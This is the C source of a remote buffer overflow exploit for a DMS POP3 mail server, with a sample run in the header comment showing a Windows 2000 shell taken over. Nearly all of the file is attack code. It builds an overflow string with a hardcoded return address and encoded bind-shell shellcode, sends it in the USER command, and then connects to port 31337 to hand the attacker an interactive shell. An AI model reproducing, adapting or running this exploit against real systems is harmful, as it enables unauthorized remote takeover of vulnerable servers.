/*
DMS POP3 Remote BufferOverflow Exploit by NoPh0BiA <noph0bia@lostspirits.org> - SECU
no@0x00:~/Exploits/DMS-Exploit$ ./DMS-exploit 10.20.30.2
***DMS POP3 Remote BufferOverflow exploit by NoPh0BiA.***
[x] Connected to: 10.20.30.2 on port 110.
[x] Sending bad code..done.
[x] Trying to connect to: 10.20.30.2 on port 31337.
[x] Connected to: 10.20.30.2 on port 31337.
[x] 0wn3d!

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\WINNT\system32>

Greets to NtWaK0, kamalo, kane, schap.
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <netinet/in.h>

#define PORT 110
#define RPORT 31337
#define RET "\x92\x0D\xFC\x7F" /*win2k sp4*/

char shellcode[]=
"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x4d\x81"
"\x59\x47\x83\xeb\xfc\xe2\xf4\xb1\x69\x0f\x47\x4d\x81\x0a\x12\x1b"
"\xd6\xd2\x2b\x69\x99\xd2\x02\x71\x0a\x0d\x42\x35\x80\xb3\xcc\x07"
"\x99\xd2\x1d\x6d\x80\xb2\xa4\x7f\xc8\xd2\x73\xc6\x80\xb7\x76\xb2"
"\x7d\x68\x87\xe1\xb9\xb9\x33\x4a\x40\x96\x4a\x4c\x46\xb2\xb5\x76"
"\xfd\x7d\x53\x38\x60\xd2\x1d\x69\x80\xb2\x21\xc6\x8d\x12\xcc\x17"
"\x9d\x58\xac\xc6\x85\xd2\x46\xa5\x6a\x5b\x76\x8d\xde\x07\x1a\x16"
"\x43\x51\x47\x13\xeb\x69\x1e\x29\x0a\x40\xcc\x16\x8d\xd2\x1c\x51"
"\x0a\x42\xcc\x16\x89\x0a\x2f\xc3\xcf\x57\xab\xb2\x57\xd0\x80\xcc"
"\x6d\x59\x46\x4d\x81\x0e\x11\x1e\x08\xbc\xaf\x6a\x81\x59\x47\xdd"
"\x80\x59\x47\xfb\x98\x41\xa0\xe9\x98\x29\xae\xa8\xc8\xdf\x0e\xe9"
"\x9b\x29\x80\xe9\x2c\x77\xae\x94\x88\xac\xea\x86\x6c\xa5\x7c\x1a"
"\xd2\x6b\x18\x7e\xb3\x59\x1c\xc0\xca\x79\x16\xb2\x56\xd0\x98\xc4"
"\x42\xd4\x32\x59\xeb\x5e\x1e\x1c\xd2\xa6\x73\xc2\x7e\x0c\x43\x14"
"\x08\x5d\xc9\xaf\x73\x72\x60\x19\x7e\x6e\xb8\x18\xb1\x68\x87\x1d"
"\xd1\x09\x17\x0d\xd1\x19\x17\xb2\xd4\x75\xce\x8a\xb0\x82\x14\x1e"
"\xe9\x5b\x47\x37\xe8\xd0\xa7\x27\x91\x09\x10\xb2\xd4\x7d\x14\x1a"
"\x7e\x0c\x6f\x1e\xd5\x0e\xb8\x18\xa1\xd0\x80\x25\xc2\x14\x03\x4d"
"\x08\xba\xc0\xb7\xb0\x99\xca\x31\xa5\xf5\x2d\x58\xd8\xaa\xec\xca"
"\x7b\xda\xab\x19\x47\x1d\x63\x5d\xc5\x3f\x80\x09\xa5\x65\x46\x4c"
"\x08\x25\x63\x05\x08\x25\x63\x01\x08\x25\x63\x1d\x0c\x1d\x63\x5d"
"\xd5\x09\x16\x1c\xd0\x18\x16\x04\xd0\x08\x14\x1c\x7e\x2c\x47\x25"
"\xf3\xa7\xf4\x5b\x7e\x0c\x43\xb2\x51\xd0\xa1\xb2\xf4\x59\x2f\xe0"
"\x58\x5c\x89\xb2\xd4\x5d\xce\x8e\xeb\xa6\xb8\x7b\x7e\x8a\xb8\x38"
"\x81\x31\xb7\xc7\x85\x06\xb8\x18\x85\x68\x9c\x1e\x7e\x89\x47";

struct sockaddr_in hrm;

void shell(int sock)
{
 fd_set fd_read;
 char buff[1024];
 int n;

 while(1) {
  FD_SET(sock,&fd_read);
  FD_SET(0,&fd_read);

  if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;

  if( FD_ISSET(sock, &fd_read) ) {
   n=read(sock,buff,sizeof(buff));
   if (n == 0) {
       printf ("Connection closed.\n");
       exit(EXIT_FAILURE);
   } else if (n < 0) {
       perror("read remote");
       exit(EXIT_FAILURE);
   }
   write(1,buff,n);
  }

  if ( FD_ISSET(0, &fd_read) ) {
    if((n=read(0,buff,sizeof(buff)))<=0){
      perror ("read user");
      exit(EXIT_FAILURE);
    }
    write(sock,buff,n);
  }
 }
 close(sock);
}

int conn(char *ip,int p)
{
 int sockfd;
 hrm.sin_family = AF_INET;
 hrm.sin_port = htons(p);
 hrm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(hrm.sin_zero),8);
 sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&hrm,sizeof(struct sockaddr)))<0)
 {
  perror("connect");
  exit(0);
 }
 printf("[x] Connected to: %s on port %d.\n",ip,p);
 return sockfd;
}

int main(int argc, char *argv[])
{
 if(argc<2)
 {
  printf("Usage: IP.\n");
  exit(0);
 }
 
 int x,y;
 char *buffer=malloc(1554),*A=malloc(1121),*B=malloc(30),*target=argv[1];
 printf("***DMS POP3 Remote BufferOverflow exploit by NoPh0BiA.***\n");
 memset(buffer,'\0',1554);
 memset(A,0x41,1121);
 memset(B,0x42,30);
 strcat(buffer,A);
 strcat(buffer,RET);
 strcat(buffer,B);
 strcat(buffer,shellcode);
 x = conn(target,PORT);
 printf("[x] Sending bad code..");
 write(x,"USER ",5);
 write(x,buffer,strlen(buffer));
 write(x,"\r\n",2);
 printf("done.\n");
 close(x);
 sleep(3);
 printf("[x] Trying to connect to: %s on port %d.\n",target,RPORT);
 if((y=conn(target,RPORT)))
 {
 printf("[x] 0wn3d!\n\n");
 shell(y);
 }
 close(y);
}